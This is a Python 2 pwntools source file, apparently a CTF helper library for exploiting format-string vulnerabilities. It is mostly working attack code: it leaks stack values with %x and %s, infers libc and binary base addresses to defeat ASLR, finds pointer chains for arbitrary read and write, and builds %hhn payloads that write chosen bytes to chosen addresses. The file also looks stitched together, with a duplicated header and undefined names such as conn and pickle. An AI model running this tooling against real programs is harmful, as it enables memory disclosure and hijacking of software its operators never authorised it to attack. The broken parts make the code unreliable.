#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
from struct import pack, unpack

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pasteBin
#
# bunch of functions to help exploit format strings


import sys
from pwn import *

context.log_level = 1337

# todo, make helper functions for cases when you need to put the program in a loop
# make a function to find the offset of your string on the stack
# make better use of the ELF functions
	# might not even need libc cuz it's in binary.libs
	# should use that
# extrace the pointer finding magic into it's own function and tidy up the valid function

class FormatStringPointer(object):
	"""
		This is a value on the stack
		this class is designed to keep track of it's offset, value and 
		what it points to

		if you give it libc and a binary it'll also workout what it points to 
	"""

	def __init__(self, formatString, offset, value=None, string=None):

		"""
			There are a horrendous amount of edge cases
			e.g 
			this points to a pointer on the stack that also is valid assembly that
			occurs in libc.
			I am not even gunna try to account for that
		"""
		# this is a the parent formatString class
		self.formatString = formatString 
		# the offset needed in the format string to get this
		self.offset = offset
		# the value that you get when you %x this thing as an int
		self.value = value
		# this is what this supposedly points to
		self.string = string
		# if this points to something in libc, this is the offset, or the pointer on the stack
		self.pointer_offset = None
		# how long of a chain points to this thing
		self.chain_len = 0 
		# just a plain 'ol number .. for now!
		self.pointer_type = "number"
		# this can only point to one thing 
		self.next = None
		# but many things can point to it I suppose ... errgh complexity
		self.prevs = []
		# this one 'prev' will be the one with the longest chain
		self.prev = None
		# have a list of budy pointers that you can use to work out your 
		# value based on theirs when they get leaked
		# based on the pointers in each closed buddy group
		# I can tell what section of the binary they point to e.g libc, heap, stack etc
		self.buddies = []
		# when I update a pointer I need to know where it was last
		# so that it can tell other pointers who ask, how much they should change
		self.last_diff = 0
		# every time we leak, set all the previous leaks to dirty
		# because they could have changed
		self.dirty = False
		# if you gave me a string I'll work out if it's important
		if string and len(string) > 1:
			self.update_deref(string)

	def get_buddy_offsets(self):
		offsets = [self.offset]
		for b,d in self.buddies:
			offsets.append(b.offset)
		return offsets

	def add_buddy(self, buddy_leak, distance):

		if buddy_leak.offset not in [l.offset for l,d in self.buddies]:
			# add the buddy and the distance you need to add to get to
			# the same value
			self.buddies.append((buddy_leak, distance))

	def update_from_buddy(self, leak):
		self.dirty = False
		if leak.offset == self.offset:
			return
		try:
			distance = [d for l,d in self.buddies if l.offset == leak.offset][0]
		except:
			print "lolz you need to recurse or leak more"
			return

		# we now know what we point at
		self.value = leak.value - distance


	def set_next(self, leak):
		"""
			if I find the leak that this points to on the stack
			set this.next to that leak
		"""
		# keep track of which leak this points to
		self.next = leak
		# increase the chain length, if it gets to 2 then we get free write/read
		# add me to the list of leaks that point to this fella
		leak.prevs += [self] 
		if leak.prev == None or leak.prev.chain_len < self.chain_len:
			leak.prev = self
			leak.chain_len = self.chain_len + 1
		


	def update_value(self, value):
		"""
			this is called if you have a pointer
			that points to this and it just changed me
			in that case you know that you know where everything is
			on the stack 
		"""
		# I might want to save what offset I point to or something

		self.last_diff = value - self.value
		self.value = value

		# could have been a fluke last time
		if self.pointer_type == "unknown but legit":
			self.pointer_type = "number"

		# if it's bouncin this much it's probably not valid
		if self.last_diff > (0x1 << self.formatString.bits):
			self.pointer_type = "invalid"


	def points_to(self):
		"""
			return the int value this points to NO REFRESH
		"""
		if self.string == None or len(self.string) == 0:
			# print "DEREF NULL"
			return 0

		pointer_len = 4 if self.formatString.bits == 32 else 8

		str_trunk_lst = self.string[:pointer_len]
		rev_lst = [x.encode('hex') for x in str_trunk_lst ][::-1]
		strthing = ''.join(rev_lst)
		ptr = int("0x" + strthing ,16)
		return ptr

	def update_deref(self, string):
		"""
			Give me the thing I point to
			and I'll work out wtf it is`
		"""
		self.pointer_type = "unknown but legit"
		self.string = string
		# find if it points to libc of Code
		if len(string) > 1: # only worth checking for more than 1 byte leaked
			# search for the string in libc
			code_segments = []
			libc_len = 0
			code_len = 0
			if self.formatString.libc and hex(self.value)[:4] != "0x80": # cuz nah
				libc_results = list(self.formatString.libc.search(string))
				libc_len = len(libc_results)
				code_segments += libc_results
			if self.formatString.binary:
				# convert unprintable chars into wildcards .{,3} upto 3
				# could be awekward if there is a couple .'s at the start
				# since we are probably leaking return pointers, we could look for
				# call instructions just behind them
				# we'll see if it's an issue
				# maybe find the vague region, find the last call inst
				# then you know we are pointing to the next instructions
				code_results = list(self.formatString.binary.search(string))
				# if self.pointer_type == "code":
					# print "this is what it really points to"
					# print binary.data[self.pointer_offset:self.pointer_offset+8]
				code_len = len(code_results)
				code_segments += code_results

			# is it unique?
			if len(code_segments) == 1:
				# if self.libc
				self.pointer_offset = code_segments[0]

				if libc_len == 1:
					self.pointer_type = "libc23"

					if not self.formatString.libc_fixed:
						self.formatString.libc.address = self.value - self.pointer_offset
					else:
						if self.value - self.pointer_offset != 0:
							print "ERROR" # could be usefull in binary case
						else:
							print "further affirmation of our excellence" 

					self.formatString.libc_fixed = True
				elif code_len == 1:
					self.pointer_type = "code"
					print "FOUND THE BINARY!"
					if not self.formatString.binary_fixed:
						print self.formatString.binary.address
						# maybe add the entry point of something
						self.formatString.binary.address = self.value - self.pointer_offset
					else:
						if self.value - self.pointer_offset != 0:
							print "ERROR"
						else:
							print "further affirmation of our excellence" 
					self.formatString.binary_fixed = True
				else:
					raise "ERROR: WTF CODE IS WRONG HERE"  

			elif len(code_segments) == 0: 

				pointer_len = 4 if self.formatString.bits == 32 else 8
				# maybe it's a pointer on the stack?
				if len(string) >= pointer_len: # pointer_len bytes for a pointer
					# make an array of the bytes in the pointer, little endian style
					ptr = [ord(x) for x in string[:pointer_len]][::-1]
					# convert the value into a string of bytes
					my_ptr = self.formatString.decompose_data(self.value)[::-1]

					# get rid of 0's at the front
					while ptr[0] == 0:
						ptr = ptr[1:]
					while my_ptr[0] == 0:
						my_ptr = my_ptr[1:]

					if ptr[:2] == my_ptr[:2]: # if the first byte matches, it's probably the stack
						print "I HAVE FOUND THE STACK"
						# this actually tells me a lot,
						# if I can find the thing this points to
						# I can work out the address of everything 
						# on the stack around me
						self.pointer_type = "maybe_stack"
						# need beter
						self.pointer_offset = self.value # points to yeahhh. the stuff
						# let the formatString workout what we point to



	def write(self, byte):
		"""
			write this byte using this pointer,
			todo: update my string
		"""
		payload = self.formatString.set_cur_val(byte)
		payload += "%{0}$hhn".format(self.offset)
		self.string[0] = byte
		if self.next:
			self.next.update_value(self.points_to())
		return payload

	def print_me(self):

		"0001:0xffaabbcc:False:stack: -> value"
		print "{offset}:{value:x}:{dirty}:{pointer_type}:{string}".format(**self.__dict__)


	def valid(self):
		"""
			if I've allready been assesd as having a type other than just 'number'
			then i'm a valid poitner

			try searching in libc/binary if we know the offset

			otherwise just ballpark guess if something is a pointer, adjust to taste
			helps it to not crash :D


			This needs to be changed, I need a function that works out where a pointer 
			points to and stuff using the binary
		"""
		if self.pointer_type == "invalid":
			return False

		if self.pointer_type != "number":
			return True

		# guilty until proven otherwise
		self.pointer_type = "invalid"
		# don't want any nulls slipping through
		if self.value == 0:
			return False # null case
			
		if self.offset in self.formatString.bad_offsets:
			return False

			
		if self.value in self.formatString.bad_values:
			return False



		# break the libc/binary finding into their own functions

		# if we have the binary leaked (or no aslr)
		# we can easily check if this pointer points to something in there
		if self.formatString.binary and self.formatString.binary_fixed:
			off = self.formatString.binary.vaddr_to_offset(self.value)
			if off != None:
				self.pointer_type = "code"
				self.pointer_offset = off
				return True

		# if we have libc leaked we can easily check if this pointer 
		# points to something in there
		if self.formatString.libc and self.formatString.libc_fixed:
			off = self.formatString.libc.vaddr_to_offset(self.value)
			if off != None:
				self.pointer_type = "libc1"
				self.pointer_offset = off
				return True



		if hex(self.value)[:3] != "0x7" and \
		hex(self.value)[:3] != "0x5" and \
		hex(self.value)[:3] != "0xf" and \
		hex(self.value)[:4] != "0x80":
			return False


		# print hex(self.value)

		# I admit this isn't the best solution, but it works
		# well, so long as you don't have a ropchain at 0x780000
		if hex(self.value)[:4] == "0x78": # Y in asci,
			return False
		if hex(self.value)[:4] == "0x70": # Q in asci,
			return False

		# if "0000" in hex(self.value): # too many 0's probs not legit
		# 	return False

		if "ffffffff" in hex(self.value): # too many f's probs not legit
			return False


		if "4141" in hex(self.value): # hahah I legit need this
			return False

		dLen = len(hex(self.value))

		# some example pointer lengths
		if dLen != len("0x55f55d09d6a0") and \
		dLen != len("0x63b944c753c6fc00") and self.formatString.bits == 64:
			return False

		if dLen != len("0xaabbccdd") and \
		dLen != len("0x804ccdd") and self.formatString.bits == 32:
			return False

		self.pointer_type = "unknown but legit"
		return True

class FormatStringLeaker(object):
	"""
		This class helps you manage your format string vuln
		you give it a format string and it'll help manage things

		you give it a function that takes a format string and returns
		what the format string turns into
	"""

	def __init__(self,
		format_func=None,
		libc=None,
		binary=None,
		bits=32,
		bad_offsets=[],
		bad_values=[],
		offset=0,
		padding=0,
		saveFile=None,
		runs_fresh=True
		):

		"""
			format_func takes a string and returns the formated output
			from the target binary

			if you can't call it multiple times, you'll need to try and
			put the program in a loop

			takes a pwntools ELF binary as libc and binary
		"""


		# this function does the format string 
		self.format_func = format_func
		# save our leaks here, use this if you have a one shot format
		# and things seem to stay where they are 
		self.saveFile = saveFile
		# just pwntools connection
		self.conn = conn
		# this is the padding required to put our string in it's own block
		self.padding_len = padding
		# this is the offset to our string on the stack (first full block)
		self.offset_to_string = offset
		# my magical pointers
		self.leaks = [None]
		# num bytes printed so far
		self.current_val = 0
		self.bits = bits # 32 or 64
		self.chain_starter = None
		self.binary = binary
		self.libc = libc
		# set these to true if we find a leak
		self.libc_fixed = False
		self.stack_found = False
		self.binary_fixed = False
		self.stack_start = None #  + offset*pLen = addr of offset on stack

		# does it restart the binary each time?
		self.runs_fresh = runs_fresh
		# the regions are lists of offsets
		# that are all calculatable from each other
		# i.e in the same memory group after aslr
		# I'll be able to put things in different regions
		# and then lable them as stack, libc etc
		# that sounds pretty usefull
		self.regions = [] 

		#bad offsets are offsets that should not be derefed
		self.bad_offsets = bad_offsets
		#bad values are values that should not be derefed, e.g stack cooies (if you know them)
		self.bad_values = []
		for offset in bad_offsets:
			self.bad_values += [self.dump_offset(offset)]

		# the binary will just be in it's spot
		if self.binary and not self.binary.aslr:
			self.binary_fixed = True


		if format_func == None and conn == None:
			print "Once you put the progaram in a loop, give me a format function and I'll do my magic"


	def update_leak_func(self, func, runs_fresh=None):
		self.format_func = func
		if runs_fresh != None:
			self.runs_fresh = runs_fresh


	def add_leak(self, leak):
		while leak.offset >= len(self.leaks):
			self.leaks += [None]

		if self.leaks[leak.offset] == None: 
			self.leaks[leak.offset] = leak
		else:
			self.leaks[leak.offset].update_value(leak.value)

		# it's just been added/updated so it's not dirty
		self.leaks[leak.offset].dirty = False

		return self.leaks[leak.offset]

	def save_state(self):
		with open(self.saveFile, 'w+') as f:
			f.write(pickle.dump(self))

	def load_state(self):
		"""
			DO NOT TRUST THE PICKLE OF OTHERS
		"""
		obj = None
		try:
			obj = pickle.load(self.saveFile)
			self = obj
		except:
			print "failed to load, wat evs"
			pass


	def find_offset(self, offset=1, max_len=10):
		"""
			This is a useful RnD function,
			it finds the offset of our string on the stack
			and the ammount of padding required to get to it
		"""
		# 12 or 24 bytes, guarrentees that a word has only our characters
		# so like, you don't get the case where you've filled all but 1 char in 2 blocks each
		# this way there has to be a valid thing 
		payload = ""
		if self.bits == 32:
			payload = "0123456789AB" 
		else:
			payload = "0123456789ABCDEFGHIJKLMN"

		offsets = range(offset, offset + max_len)
		response = self.dump_offset_list(offsets, payload)
		print [hex(x) for x in response]
		for pos, r in enumerate(response):
			decomp = ''.join([chr(x) for x in self.decompose_data(r)])
			if decomp in payload:
				offset_found = offset + pos
				first_char = decomp[0]
				padding_len = payload.index(first_char)

				self.offset_to_string = offset_found
				self.padding_len = padding_len

				print "Found the offset!!"
				print "Offset: {o}".format(o=offset_found)
				print "padding: {p}".format(p=padding_len)
				return

		print "soz, didn't find it, try again with offset {o}".format(o=offset + len(response)) 

	def set_leaks_dirty(self):
		for leak in self.leaks:
			if leak != None:
				leak.dirty = True


	def extract_printf(self, refs, prep_string=""):
		"""
			Given a list of refs e.g %x, %llx, %10$s
			return a list of the things they return

			use prep_string to prepend things to the leak
			used for finding offsets and padding

			Every time we call this, we should assume that 
			the other pointers we have could have changed
			so we set their dirty flag
		"""
		if self.runs_fresh:
			self.libc_fixed = False
			self.stack_found = False
			self.binary_fixed = False
			self.stack_start = None #  + offset*pLen = addr of offset on stack
			self.set_leaks_dirty()

		# leak the 'r'th thing off the stack
		gen_ref = lambda r: "*{ref}*".format(ref=r)

		# generate a few of these in a row
		payload = prep_string + "*"
		payload += ''.join([gen_ref(r) for r in refs])
		payload += "*OO"
		leaks = self.format_func(payload)
		# try:
		# 	leaks = self.format_func(payload)
		# except:
		# 	# this caused it to crash so one of them isn't valid
		# 	print refs
		# 	raise "don't give me bad pointers"

		print leaks
		leaks = leaks.split('**')[1:-1] # remove the OO  and the empty start
		print refs
		return leaks

	# get one offset
	def dump_offset(self, offset):
		"""
			Leak the value at an offset using the format string
		"""

		if self.bits == 32:
			code_leak_payload = lambda r: "%{ref}$x".format(ref=r)
		else:
			code_leak_payload = lambda r: "%{ref}$llx".format(ref=r)
		return int(self.extract_printf([code_leak_payload(offset)])[0],16)

	# leak a pointer string
	def deref_offset(self, offset):
		"""
			Leak what an offset value points to using %s
		"""
		# todo: consider updating our leaks when we do stuff
		# but maybe they change so errrgh we'll see how it goes

		code_leak_payload = "%{ref}$s".format(ref=offset)
		return self.extract_printf([code_leak_payload])[0]

	# leak a pointer string
	def leak_val_and_deref(self, offset):
		"""
			Leak what an offset value points to using %s
			and leak it's value
			usefull so we get what it points to and the offset
			n stuff
		"""
		# todo: consider updating our leaks when we do stuff
		# but maybe they change so errrgh we'll see how it goes

		code_leak_payload = "%{ref}$s".format(ref=offset)
		if self.bits == 32:
			code_dump_payload = lambda r: "%{ref}$x".format(ref=r)
		else:
			code_dump_payload = lambda r: "%{ref}$llx".format(ref=r)

		ext = self.extract_printf([code_dump_payload(offset), code_leak_payload])
		# return the tuple (value, deref)
		return (int(ext[0],16), ext[1])

	# get a few values
	def dump_offset_list(self, offsets, prep_string=""):
		"""
			dump a list of offsets from the stack
		"""
		# leak the 'r'th thing off the stack
		if self.bits == 32:
			offset_str = lambda r: "%{ref}$x".format(ref=r)
		else:
			offset_str = lambda r: "%{ref}$llx".format(ref=r)

		refs = [offset_str(x) for x in offsets]

		ret = [ int(x,16) for x in self.extract_printf(refs, prep_string=prep_string)]
		print len(refs)
		print len(ret)
		return ret


	# get a few strings (dereferenced pointers)
	def deref_offset_list(self, offsets):
		"""
			Deref a list of offsets as strings using %s
		"""
		# leak the 'r'th thing off the stack
		offset_str = lambda r: "%{ref}$s".format(ref=r)
		refs = [offset_str(x) for x in offsets]
		ret = [ x for x in self.extract_printf(refs)]
		return ret

	def grab_pointers(self, offsets):
		"""
			Grab some values off the stack and
			return the ones that look like pointers

			also, update our leaks as we go
		"""

		pointers = self.dump_offset_list(offsets)
		print [hex(p) for p in pointers]
		will_deref = []
		print len(pointers)
		print len(offsets)
		for pos, pointer in enumerate(pointers):
			offset = offsets[pos]
			leak = FormatStringPointer(self, offset, value=pointer)
			leak = self.add_leak(leak)
			if leak.valid():   
				will_deref += [leak]
		return will_deref


	def find_stack_leaks(self):
		pointer_len = 4 if self.bits == 32 else 8
		if not self.stack_found:
			for leak in self.leaks:
				if leak != None and leak.string != None:
					# check all the leaks to see if we have found it
					for leak_2 in self.leaks:
						# make sure it doesn't point to something that's
						# really far away. like null..
						diffSet = (abs(leak.points_to() - leak.value))/pointer_len
						if (abs(leak.points_to() - leak.value))/pointer_len < len(self.leaks):
							if leak_2 != None and leak_2.value == leak.points_to():
								self.stack_found = True
								self.stack_start = leak.value - leak_2.offset*pointer_len
								leak.set_next(leak_2)
								# now that we know where the stack is
								# I can go back to the start and find more
								# pointers to the stack
								return self.find_stack_leaks()
		else:
			for leak in self.leaks:
				if leak != None and leak.value > self.stack_start:
					leak.pointer_type = "stack"
					points_to_offset = (leak.value - self.stack_start)/pointer_len
					if points_to_offset < len(self.leaks):
						leak_2 = self.leaks[points_to_offset]
						if leak_2 != None:
							leak.set_next(leak_2)
							if leak_2.chain_len >= 2:
								# get the leak that is the start of the chain
								# well, not the actuall start if it's longer than 2
								# but that's all we need
								self.chain_starter = leak_2.prev.prev
								print "A chain of pointers has been found"
								print "this can be used to do arbitrary read/writes"
								print "Offsets: {0}->{1}->{2}".format(
									self.chain_starter.offset,
									leak.offset,
									leak_2.offset)

						else:
							print "haven't found the thing we point to offset =",
							print points_to_offset

	def leak_more(self, amount=10):
		"""
			Leak more pointers and shit,
			print out as we go 
		"""

		leak_len = len(self.leaks)

		offsets_z = range(leak_len, leak_len + amount)
		self.leak_n_deref(offsets_z)

	def leak_n_deref(self, offsets):
		will_deref = self.grab_pointers(offsets)
		if len(will_deref) == 0:
			return
	
		offsets = [leak.offset for leak in will_deref]
		strings = self.deref_offset_list(offsets)

		# match up the leaks with their strings
		for leak, string in zip(will_deref, strings):
			leak.update_deref(string)

		self.find_stack_leaks()


	def get_grid_diffs(self, pointers):
		pointer_diff_grid = []
		# initialise my grids
		for p1 in pointers:
			pointer_diff_grid.append([])
			for p2 in pointers:
				pointer_diff_grid[-1] += [0]

		# don't be clever
		for pos1, p1 in enumerate(pointers):
			for pos2, p2 in enumerate(pointers):
				pointer_diff_grid[pos1][pos2] = p1.value - p2.value
		return pointer_diff_grid


	def leak_and_buddy(self, offsets):

			# generate a 2d grid of differences between the pointers I leak
			pointer_diff_grid1 = []
			# make another one for the second leaking and see what's different
			pointer_diff_grid2 = []

			# grab some pointers

			pointers = self.grab_pointers(offsets)

			# print start_offset
			# print [hex(a.value) for a in pointers]
			if len(pointers) == 0:
				return 	

			pointer_diff_grid1 = self.get_grid_diffs(pointers)

			# grab some new pointers
			overlap_pointers = self.grab_pointers(offsets)
			# print [hex(a.value) for a in overlap_pointers]
			# need to handle the case that they aren't the same size
			# check all the offsets and chuck out the new ones, we only want reliable 
			# pointers
			if len(overlap_pointers) != len(pointers):
				# fix this issue
				return


			pointer_diff_grid2 = self.get_grid_diffs(overlap_pointers)
			
						

			# I now have 2 grids that tell me the relative distance between pointers
			# the parts where the grid are the same tell me the reliable pointers
			# I'll generate a dictionary of offsets and distances
			# and I'll save that to the pointer
			# so I can give it a pointer and an offset and if it knows it's distance 
			# to that pointer (from the offset) then it can recalculate it's offset
			# I'll be like, learn where you are based off this offset/pointer
			# and if it has that offset as a buddy then it'll get it
			# otherwise it'll ask all of it's buddies and they'll ask theirs
			# once it's updated, set dirty to False
			# you can respond "yep all g, I'm up to date"
			# flag dirty all the pointers after each run
			for x in range(len(pointers)): # don't do the last one, aldready done by others
				for y in range(len(pointers)):
					if pointer_diff_grid1[x][y] == pointer_diff_grid2[x][y]:
						# this means that they are constantly the same 
						# distance appart. Once I clean this up I should do it with 3
						# to avoid flukes

						# since I do this clever update thing with pointers
						# the two arrays of pointers will actually be the same

						# get the pointers
						px = overlap_pointers[x]
						py = overlap_pointers[y]

						distance = px.value - py.value

						if distance != 0:
							# we have our leaks
							# time to update
							# px + distance = py
							px.add_buddy(py, -distance)
							py.add_buddy(px, distance)


	def chunks(self, l, n):
		"""return a list of successive n-sized chunks from l."""
		arr = []
		for i in range(0, len(l), n):
			arr.append(l[i:i+n])
		return arr



	def get_regions_from_offsets(self, pointer_offsets):
		self.regions = []
		for offset in pointer_offsets:
			for region in self.regions:
				if offset in region:
					break
			else:
				# if we don't find it, then we make a new region
				self.regions.append(set(self.get_all_leak_buddies(offset)))

	def show_regions(self):
		for region in self.regions:
			print "-- Region --"
			for offset in region:
				print hex(self.leaks[offset].value) +":"+ str(offset) + ":" + self.leaks[offset].pointer_type,
			print

	def smart_leaks(self, leak_size=10, num_leaks=10):
		"""
			Leak pointers and workout what's what
		"""
		start_offset = 1
		for leak_set in range(num_leaks):
			offsets_z = range(start_offset, start_offset + leak_size)
			self.leak_and_buddy(offsets_z)

			start_offset += leak_size

		# I've now got a bunch of linked up leaks
		# I can go through and group them together
		# do a few test cases to determine if 2 groups can be merged


		# now compress the regions
		pointer_offsets = [leak.offset for leak in self.leaks if leak != None and leak.valid()]

		self.get_regions_from_offsets(pointer_offsets)

		# grab the first pointer from each region
		region_representatives = [self.leaks[list(region)[0]].offset for region in self.regions]
		region_groups = self.chunks(region_representatives, leak_size/2)
		for pos, reg in enumerate(region_groups):
			for region_group in region_groups[pos+1:]:
				self.leak_and_buddy(region_group + reg)
			self.get_regions_from_offsets(pointer_offsets)

		# update all the pointers to where they should theoretically between
		# propogate those to the groups
		# this is to find libc and the code section
		# I could do this in one hit, but meh, do it seperatly
		for region in self.regions:
			region_type = "unknown"
			for leak_offset in region:
				leak = self.leaks[leak_offset]
				val, string = self.leak_val_and_deref(leak_offset)
				leak.value = val
				leak.update_deref(string)
				if leak.pointer_type == "code" or leak.pointer_type == "libc" or leak.pointer_type == "stack":
					region_type = leak.pointer_type
					break
			else:
				#didn't find itf
				continue

			# if aslr is on then try and work out what's what based on the shufflings
			if self.binary.aslr:
				for leak_offset in region:
					# print region_type
					# now we can update all the other pointers
					self.leaks[leak_offset].pointer_type = "suspected_" +region_type


		if self.binary.aslr:
			# the remaining regions might be the stack,
			# to find the stack you need to do them all in one hit
			for region in self.regions:
				leak_type = self.leaks[list(region)[0]].pointer_type
				if leak_type == "unknown but legit":
					# well, can only do <leak_size> many at a time
					self.leak_n_deref(list(region)[:leak_size])

				self.find_stack_leaks()
				leak_type = self.leaks[list(region)[0]].pointer_type
				if leak_type != "unknown but legit":
					for leak_offset in region:
						# now we can update all the other pointers
						self.leaks[leak_offset].pointer_type = leak_type


		# update for the stack leaks
		if self.binary.aslr:
			for region in self.regions:
				leak_type = "unknown but legit"
				for leak_offset in region:
					leak_type = self.leaks[leak_offset].pointer_type
					if leak_type != "unknown but legit":
						break
				else:
					print 'no findings'
					continue

				for leak_offset in region:
					# now we can update all the other pointers
					self.leaks[leak_offset].pointer_type = leak_type

		# finally, find leaks to the stack and update 

		# leak one pointer from each region
		# and then use the buddies
		# I made every one in each region buddies with each other 
		# so all I have to do is leak one

		# grab one from each
		region_representatives = [self.leaks[list(region)[0]] for region in self.regions]
		self.key_reps = region_representatives
		self.fix_all_the_leaks()
		self.update_the_leaks()
		self.print_leaks()



	def fix_elf(self, elf, elf_name):
		"""
			give it either libc or the binary and it'll find the best pointer_type
			to get it's location, we can then use it to validate other pointers

			elf_name == "libc" or "binary"
		"""
		# now all the leaks have been fixed lets find all the things
		best_candidate = None
		best_length = 0
		offset2elf = 0
		for pointer in self.leaks:
			if pointer != None and pointer.string != None and len(pointer.string) > best_length:
				elf_results = list(elf.search(pointer.string))
				if len(elf_results) == 1:
					best_candidate = pointer
					offset2elf = elf_results[0] - elf.address
					best_length = len(pointer.string)

		if best_candidate == None:
			print "couldn't find a candidate pointer for " + elf_name
			return False

		best_candidate.pointer_type = elf_name
		if best_length < 3:
			print "there isn't much to go on but we found something (<3 chars match)"
		print "our best candidate for finding {elf} is:".format(elf=elf_name)
		best_candidate.print_me()
		print hex(offset2elf)
		print hex(elf.address)

		elf.address = best_candidate.value - offset2elf
		print 'asdfasdf ' + elf_name + hex(best_candidate.value)
		print hex(elf.address)
		return True


	def fix_all_the_leaks(self):


		stack_leak = None
		for leak in self.leaks:
			if leak and leak.pointer_type == "stack" and leak.pointer_offset:
				# add a stack pointer to the mix so we get where the stack is
				stack_leak = leak


		# update the values of all of my pointers
		# and deref the 

		offset_str  = None
		offset_leak = None
		# leak the 'r'th thing off the stack
		if self.bits == 32:
			offset_str = lambda r: "%{ref}$x".format(ref=r)
			offset_leak = lambda r: "%{ref}$.4s".format(ref=r) # only want the pointer
		else:
			offset_str = lambda r: "%{ref}$llx".format(ref=r)
			offset_leak = lambda r: "%{ref}$.8s".format(ref=r) # only want the pointer
		

		refs = []
		for x in self.key_reps:
			refs += [offset_str(x.offset)]
			refs += [offset_leak(x.offset)]
		# these are the values of my pointers
		# I now add the value and leak of my stack leak;

		if stack_leak == None:
			print "no stack leak :("
		else:
			refs.append(offset_str(stack_leak.offset))
			refs.append(offset_leak(stack_leak.offset))

		extracted = self.extract_printf(refs) 
		# go through all of the extracted info
		# and match up everything

		for val_n_de, leak, region in zip(self.chunks(extracted, 2), self.key_reps, self.regions):
			value = int(val_n_de[0],16)
			deref = val_n_de[1]
			leak.update_value(value)
			leak.update_deref(deref)
			# we've leaked one thing from each region
			# time to update each region
			for offset in region:
				self.leaks[offset].update_from_buddy(leak)

			# now everything in this region is updated



		# match up the leaks with their strings# 5816537156494
		# do the stack ones seperately
		# for leak, val in zip(self.key_reps, extracted):
		# 	leak.update_value(int(val,16))
		# 	.binary.vaddr_to_offset(self.value)
		# 	if leak.pointer_type == "code":
		# 		self..binary.vaddr_to_offset(self.value)

		self.show_regions()


	def update_the_leaks(self):
		# no format stringing after this point, we have a good model of 
		# what every offest is, and what it points to
		self.libc_fixed   = self.fix_elf(self.libc, "libc3")
		self.binary_fixed = self.fix_elf(self.binary, "code")
		if self.libc_fixed:
			print 'yoyoyoyoyoyoy'
			print hex(self.libc.address)
			for pointer in self.leaks:
				if pointer == None:
					continue
				off = self.libc.vaddr_to_offset(pointer.value)
				if off != None:
					self.pointer_type = "libc4"
					self.pointer_offset = off
		if self.binary_fixed:
			for pointer in self.leaks:
				if pointer == None:
					continue
				off = self.binary.vaddr_to_offset(pointer.value)
				if off != None:
					self.pointer_type = "code"
					self.pointer_offset = off
		self.find_stack_leaks()


	def print_leaks(self):
		for leak in self.leaks:
			if leak:
				leak.print_me()





	# getting into graph theory here...
	def get_all_leak_buddies(self, offset_1):
		"""
			Given an offset, find all the buddies
			that are connected to it


		"""
		offsets = set(self.leaks[offset_1].get_buddy_offsets())
		newOffsets = offsets

		# keep expanding untill we don't get any new ones
		while len(newOffsets) != 0:
			oldOffsets = offsets

			for offset in newOffsets:
				offsets = offsets.union(set(self.leaks[offset].get_buddy_offsets()))

			# get the ones we didn't have already
			newOffsets = offsets.difference(oldOffsets)

		for offsetA in offsets:
			for offsetB in offsets:
				leakA = self.leaks[offsetA]
				leakB = self.leaks[offsetB]

				distance = leakA.value - leakB.value

				if distance != 0:
					# we have our leaks
					# time to update
					# leakA + distance = leakB
					leakA.add_buddy(leakB, -distance)
					leakB.add_buddy(leakA, distance)


		return offsets







	def find_libc_offset(self):
		"""
			1) Leak memory using the format string
			2) Find the valid pointers/offsets
			3) Deref them and compare with libc
			4) if match, calculate offset

			uses pwntools' ELF library

			should probably make it stop after a while but whatevs
		"""
		# leak a big range and then deref all the pointers till you find one in libc
		# then adjust the offset

		while True:
			self.leak_more()
			# all handled by the pointers, cheers bros :D


	def set_cur_val(self, a):
		"""
			~~~ IMPORTANT ~~
			the %n operator write the number of bytes written so far 
			%hhn writes one byte (0x00 -> 0xff)

			This function returns the minimal payload required
			to print out enough whitespace to get the number
			of characters printed to the desired value

			To do this it uses a global counter called 'self.current_val'
			which represents the number of bytes written so far
		"""

		# Work out how much whitespace we need to overflow
		# the least significant byte to 0x00
		gets_to_zero = 256 - self.current_val # add this to get to 0x00

		# then add the amount required to get to the desired value
		gets_to_destination = gets_to_zero + a 

		# since it's 1 byte it doesn't make sense to use more than 256 characters
		inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256

		# update the number of bytes printed
		self.current_val = a
		# if we don't have to increment then just return an empty string
		if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
			return "" 
		return "%1$" + str(inc) + "c" 

	def payload_write_data_to_addr(self, data, addr):
		"""
			Writes 4 bytes of your choice to the address given
			This is the back bone of this exploit

			Finikey as fuck
		"""
		# remove '0x' and convert to little endian
		# 0xaabbccdd -> ddccbbaa 
		# 0x12345678 -> 87654321
		hexStr = hex(data)[2:][::-1] 


		# ddccbbaa -> [dd, cc, bb, aa]
		# 87654321 -> [78, 56, 34, 12]
		byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

		# convert from hex strings to data
		bytes = [int(x,16) for x in byteList]
		print byteList


		# need to know where our offset/padding is
		payload = "A" * self.padding_len 

		# we are going to write to the 4 bytes of 
		# our address. E.G if we got data:0xa1b2c3d4 addr: 0xffb7aa00
		# we would write the following bytes to the addresses below:
		# 0xffb7aa00 : d4
		# 0xffb7aa01 : c3
		# 0xffb7aa02 : b2
		# 0xffb7aa03 : a1
		# 
		# 0xffb7aa00  == d4c3b2a1
		# (int) * 0xffb7aa00  == 0xa1b2c3d4
		# add our addresses to the start of the format string
		for a in range(len(bytes)):

			payload += p32(addr + a) 

		# this is the offset of the first address in our string
		# it also took a while to work out
		offset = self.offset_to_string 

		# set the number of bytes written to be the current length of
		# our payload
		self.current_val = len(payload)

		# this takes the a'th byte index of the address you want to 
		# write to, and writes the number of bytes printed there
		write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

		# for each byte, set the least significant byte of the
		# value for the number of bytes written
		# and write that to the address
		print bytes
		for pos, byte in enumerate(bytes):
			payload += self.set_cur_val(byte) + write_to_byte(pos)

		# return the payload string to use
		return payload


	def payload_read_addr(self, addr):
		"""
			Leak the value at address (addr)
			put it in a print statement in between ':::'
			to make finding it easier
		"""

		# necessary offset
		payload = "A" 

		# just writing the address
		payload += p32(addr)

		# this is the offset of the first address in our string
		offset = self.offset_to_string 
		self.current_val = len(payload)

		payload += ":::%{0}$s:::".format(offset)

		return payload


	def off_write(self, offset, byte): # use the ponter intstead
		"""
			write this byte using this pointer,
			todo: update my string
		"""
		payload = self.set_cur_val(byte)
		payload += "%{0}$hhn".format(offset)
		return payload


	def decompose_data(self, data):
		"""
